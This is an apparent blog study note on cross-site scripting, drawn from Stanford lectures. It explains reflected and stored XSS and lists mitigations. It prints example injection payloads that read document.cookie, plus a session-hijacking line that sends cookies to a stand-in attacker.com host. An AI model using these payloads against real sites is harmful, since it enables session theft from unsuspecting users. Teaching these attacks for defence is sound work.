---
title: "Web security: Cross site scripting (XSS)"
description: ""
pubDate: "Dec 9 2021"
---

## What is XSS?

- Unexpected JavaScript code running in an HTML document
- Unexpected code in SQL query
- Any code that combines a command with user data is susceptible

Attacker may:

- Gain ability to view/exfiltrate user cookies
- Make HTTP request using the user's cookies

#### Malicious search

User input string that may be interpreted as code, ie:
`example.com/?search=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E`, which resulting in a page that contains a scripts that accesses the user's cookie.

#### Session hijacking

Attacker insert code into their webpage, ie:
`<script> new Image().src = 'https://attacker.com/steal?cookie=' + document.cookie </script>`

#### Reflected XSS

The attack code is placed into the HTTP request itself, in which attacker's goal is to find a URL that the target user visits that includes the attack code. The attack code would be added to the URL path as query parameters.

#### Stored XSS

The attacker code is persisted into a database somehow and served to all clients.

## Examples

#### HTML attributes

A web page that incorporates some user input as HTML attributes, ie:
`<img src='avatar.png' alt='USER_DATA_HERE' />`.
User inputs: `my_name’ onload=‘alert(document.cookie)`
Resulting in: `<img src='avatar.png' alt=‘my_name’ onload=‘alert(document.cookie)’ />`

#### The `data:`

A legacy way of running JavaScript in response to a click, ie:
`<a href='javascript:alert("hi")'>Say hi</a>`.
Saves an HTTP request in an HTML page: `<img src='data:image/png;base64,iVBORw0KGgoAAAA...' />`.
Saves an HTTP request in a CSS file: `body { background-image: url(data:image/png;base64,iVBORw...); `.

#### The `a`, `src`, and iframe

`<a href='javascript:alert(document.cookie)'>Say hi</a>`
`<iframe src='data:text/html,<script>alert(document.cookie)</script>'></iframe>`
`<script src='data:application/javascript,alert(document.cookie)'></script>`

#### the `on*` attributes

`<div onmouseover='handleHover(USER_DATA_HERE)'>`
`<div onmouseover='handleHover(); alert(document.cookie)'>`

## Mitigation

- Defend user cookie: use `HttpOnly` cookie
- Prevent site from being embedded by another site: use `X-Frame-Options` header
- - X-Frame-Options not specified(default), any page can display this page in an iframe
- - X-Frame-Options: deny
- - X-Frame-Options: sameorigin
- Prevent loading resources from another site: use [Content Security Policy](/blog/csp)

---

_Based on [Feross Aboukhadijeh](https://feross.org)'s lectures ([1](https://youtu.be/XTcqlOFhpPI), [2](https://youtu.be/PlXzrtheQGc)) on web security at Stanford University._
